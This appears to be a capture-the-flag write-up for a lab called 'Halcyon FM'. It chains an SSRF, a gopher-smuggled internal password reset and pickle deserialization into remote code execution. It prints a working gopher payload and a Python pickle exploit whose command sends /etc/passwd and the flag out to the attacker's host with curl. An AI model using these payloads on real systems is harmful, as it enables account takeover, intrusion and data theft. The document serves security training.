---
title: Halcyon FM
date: 2026-10-16 07:00:00 +0100
categories: [SSRF, gopher, RCE]
image:
  path: /assets/halcyon.webp
---

**Platform:** [Webverselabs](https://dashboard.webverselabs-pro.com)

**Lab:** [Halcyon FM](https://dashboard.webverselabs-pro.com/labs/halcyonfm)

## Briefing

Halcyon FM is a small listener-supported community station in Asheville. Marlow and a rotating crew of volunteers run the whole operation off a couple of machines in the back of the studio. The public site carries the schedule and takes show pitches, and the playout console the crew uses to run automation lives on its own subdomain.

Last week an unaired pledge-drive script and the station's underwriter contact list turned up, word for word, on a rival station's blog. Nobody on the crew can explain how anyone reached the console. Starting point: the public site, as an anonymous listener.

## Enumeration

### Nmap

```
~> /webverse/halcyon nmap 10.100.0.30 -sVC --min-rate 1000 -p-

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-16 05:46 +0100
Nmap scan report for app.dockethive.io (10.100.0.30)
Host is up (0.20s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://halcyonfm.local/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.30 seconds
```

A single port, nginx fronting a redirect to a hostname I don't have yet.

### HTTP (80)

Accessing the IP redirected to a hostname, which I added to `/etc/hosts`.

```
~> /webverse/halcyon echo "10.100.0.30 halcyonfm.local" | sudo tee -a /etc/hosts
10.100.0.30 halcyonfm.local
```

<img width="1388" height="668" alt="image" src="https://github.com/user-attachments/assets/547a64e2-c981-49ed-919f-05d2adfc1d1d" />

_The public site — schedule, on-air banner, and a Pitch a show link_

### Vhost fuzzing

```
~> /webverse/halcyon ffuf -u 'http://10.100.0.30' -H 'Host: FUZZ.halcyonfm.local' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 138

studio                [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 191ms]
```

One vhost: `studio.halcyonfm.local`. Let's keep that for later and going back to the main site, which has a "Pitch a show" page.

## From "Pitch a show" to SSRF

<img width="1362" height="779" alt="image" src="https://github.com/user-attachments/assets/2405b4c9-efb5-47cf-aee4-bef15660137d" />

_The pitch form — show name, host name, artwork/demo link, description_

The pitch form takes a show name, host name, and a link to artwork or a demo mix, plus a description. The demo link field runs a server-side fetch to confirm it resolves before letting you submit, which is the interesting part.

<img width="1441" height="373" alt="image" src="https://github.com/user-attachments/assets/fb82089a-781a-471f-96cd-10b4d2b52d81" />

_POST /api/shows/import-preview — feed_url and is_dev in the body_

```json
{"feed_url":"http://10.8.0.148:8000/test","is_dev":false}
```


A `static/js/demo.js` file on the site includes a comment that the full response body is only returned to the caller in developer mode, gated behind an `is_dev` parameter in the same request.

<img width="1444" height="385" alt="image" src="https://github.com/user-attachments/assets/87879330-6930-4cad-818f-a3a4fc3e0f4c" />

_static/js/demo.js — the full response body is only returned "in developer mode"_

Flipping `is_dev` to `true` and pointing `feed_url` at a listener on my own machine confirmed the server makes the request and, with the flag set, hands back the response body.

<img width="1283" height="341" alt="image" src="https://github.com/user-attachments/assets/6ce7a042-e955-4622-b534-494959e81f2d" />


```
~> /webverse/halcyon python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.0.1 - - [16/Oct/2026 06:26:47] code 404, message File not found
10.8.0.1 - - [16/Oct/2026 06:26:47] "GET /test HTTP/1.1" 404 -
```

That's a classic server-side request forgery primitive with full response disclosure. The next thing I tried was to point it at itself to see if I could access internal resources.

## Internal API via SSRF

Looping `feed_url` through `127.0.0.1` on a handful of ports landed on 8080, which returned JSON from what looks like an internal operations API, including a pointer to `swagger.json`.

<img width="1290" height="327" alt="image" src="https://github.com/user-attachments/assets/af824311-c949-4dbd-9216-c4ff26993c10" />

_feed_url=http://127.0.0.1:8080/swagger.json_

<img width="1296" height="547" alt="image" src="https://github.com/user-attachments/assets/fae91bdd-8814-434f-b84b-9825fc03c95f" />


The spec describes a "Halcyon FM Ops API" with three endpoints of interest:

- `GET /api/v1/users` — dumps all user records
- `POST /api/v1/{userid}/change-password` — sets a user's password
- `POST /api/v1/diagnostics/stream-probe` — checks whether a stream/encoder mount is reachable, taking a `stream_url` parameter

### Viewing users

<img width="1295" height="373" alt="image" src="https://github.com/user-attachments/assets/3c1fa651-139c-4786-99c6-bb7cd88b94cb" />


Four accounts came back:

```
1 - marlow@halcyonfm.local, admin, mfaro
2 - daria@halcyonfm.local, staff, dwells
3 - rowan@halcyonfm.local, staff, rkline
4 - tomas@halcyonfm.local, staff, tvano
```

`mfaro` is the one worth chasing, since Marlow is the only admin in the list.

## Password reset through blind SSRF

The change-password endpoint doesn't ask for the current password, which is the whole leverage here. But there's a problem here, it's a `POST` with a `new_password` parameter, which the `import-preview` SSRF can't drive directly over plain HTTP, since it only fetches a single URL.

Trying the `gopher://` scheme on the internal fetch got rejected by the server:

<img width="1294" height="307" alt="image" src="https://github.com/user-attachments/assets/5cb37506-7eba-4426-948a-d6c2e9e145be" />


```json
{"error":"No connection adapters were found for 'gopher://127.0.0.1:8080/api/v1/1/change-password'","message":"not reachable","reachable":false,"status":0,"url":"gopher://127.0.0.1:8080/api/v1/1/change-password"}
```

That's the literal error Python's `requests` library throws when it hits a scheme it has no adapter for, which confirms the `feed_url` fetcher is using `requests` directly and gopher isn't supported there.

The third endpoint from the swagger spec, `stream-probe`, takes its own `stream_url` parameter and is meant to check whether a stream mount is reachable. I tested it with an arbitrary external URL and it came back without any error:

<img width="1295" height="351" alt="image" src="https://github.com/user-attachments/assets/71a63ce2-707f-4810-8364-ac0daca60c4a" />


```json
{"result":"000 0.003448s","stream_url":"http://test.com","content_type":"application/json","message":"reachable","reachable":true,"status":200,"url":"..."}
```

No error, so this second fetcher is a different implementation, I moved on to test it against the internal api and try it with a gopher scheme:

<img width="1293" height="329" alt="image" src="https://github.com/user-attachments/assets/a2a38391-c1c0-41ad-8e00-cc13f0138d62" />


```json
{"stream_url":"gopher://127.0.0.1:8080","reachable":true,"status":200}
```

Gopher is accepted here. That gives a path to smuggle an arbitrary raw TCP payload, including a crafted HTTP request, at the internal API through the stream-probe fetcher.

I then constructed a gopher URL to send a raw `POST /api/v1/1/change-password?new_password=Password123!` to the internal api service:

```
gopher%3A%2F%2F127.0.0.1%3A8080%2F_POST%2520%252Fapi%252Fv1%252F1%252Fchange-password%253Fnew_password%253DPassword123%2521%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A8080%250D%250AContent-Length%253A%25200%250D%250AConnection%253A%2520close%250D%250A%250D%250A
```

<img width="1289" height="417" alt="image" src="https://github.com/user-attachments/assets/2a9b9d5b-a2fd-4c24-a3f4-77c25e06ef47" />


Chained through `stream-probe` as the `stream_url`, the request went through without error.

```
mfaro : Password123!
```

## Accessing the studio subdomain

From our vhost scan earier, we found a `studio` subdomain. Accessing it directly brings a login page.

<img width="1151" height="669" alt="image" src="https://github.com/user-attachments/assets/6c3b389a-3e45-40e8-9817-d9e91ea8db6c" />


`studio.halcyonfm.local/login` is the Playout & Automation Console. Logging in as `mfaro` drops me straight into the admin dashboard.

<img width="1460" height="783" alt="image" src="https://github.com/user-attachments/assets/0f3dcf0b-c898-4a9e-a4d8-9f6f26825b6a" />


_On-air status, playout schedule, and an "Import playlist" feature that loads a .phl automation bundle, with a sample available via the export link_

## Pickle deserialization to RCE
The dashboard shows a playout console which different recorded sessions, a functionality to upload a load a saved .phl automation bundle. Theres also a sample `.hpl` file I can download with the export link.
I pulled the sample bundle and decoded it:

```
~> /webverse/halcyon cat ~/Downloads/overnight.hpl
gASVVwAAAAAAAAB9lCiMBG5hbWWUjBFPdmVybmlnaHQgQW1iaWVudJSMBnRyYWNrc5RdlCiMCWludHJvLWJlZJSMCGZpZWxkLTAxlIwIZHJvbmUtMDKUZYwEbG9vcJSIdS4=

~> /webverse/halcyon echo "gASVVwAAAAAAAAB9lCiMBG5hbWWUjBFPdmVybmlnaHQgQW1iaWVudJSMBnRyYWNrc5RdlCiMCWludHJvLWJlZJSMCGZpZWxkLTAxlIwIZHJvbmUtMDKUZYwEbG9vcJSIdS4=" | base64 -d
��W}�(�name��Overnight Ambient��tracks�]�(intro-bed field-01 drone-02 loop�u.
```

The `.hpl` file is base64-encoded, and the decoded bytes start with the standard pickle protocol magic. The "Import bundle" feature deserializes whatever `.hpl` file gets uploaded, which can lead to arbitrary code execution via `__reduce__`.

SSH wasn't exposed on this box, so I ruled out trying to getting a reverse shell, but the server can make outbound HTTP requests, which is enough to exfiltrate command output via curl. To test this, I tried to cat `/etc/passwd` file.

I set up a listener on my machine:

```
nc -lvnp 8000
```

And wrote a python script that builds a pickle which curls the file back to me.

Payload (`rev.py`):

```python
import pickle, os, base64

class E(object):
    def __reduce__(self):
        cmd = 'curl http://10.8.0.148:8000/ -d "$(cat /etc/passwd)"'
        return (os.system, (cmd,))

with open('evil.hpl', 'w') as f:
    f.write(base64.b64encode(pickle.dumps(E())).decode())
```

Uploading `evil.hpl` through the import bundle feature made the request to hang. Then I went back to check my listener

```
→ /webverse/halcyon nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.8.0.148] from (UNKNOWN) [10.8.0.1] 38602
POST / HTTP/1.1
Host: 10.8.0.148:8000
User-Agent: curl/8.14.1
...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
halcyon:x:1001:1001::/home/halcyon:/bin/bash
```

Code execution is confirmed, so I swapped the value of `cmd` in `rev.py` to cat the flag and reuploaded:

```
cmd = 'curl http://10.8.0.148:8000/ -d "$(cat /home/halcyon/flag.txt)"'
```

```
→ /webverse/halcyon nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.8.0.148] from (UNKNOWN) [10.8.0.1] 52982
POST / HTTP/1.1
...

WEBVERSE{p1ckl3d_th3_...}
```

Happy Hacking !!!!!!!!!!!


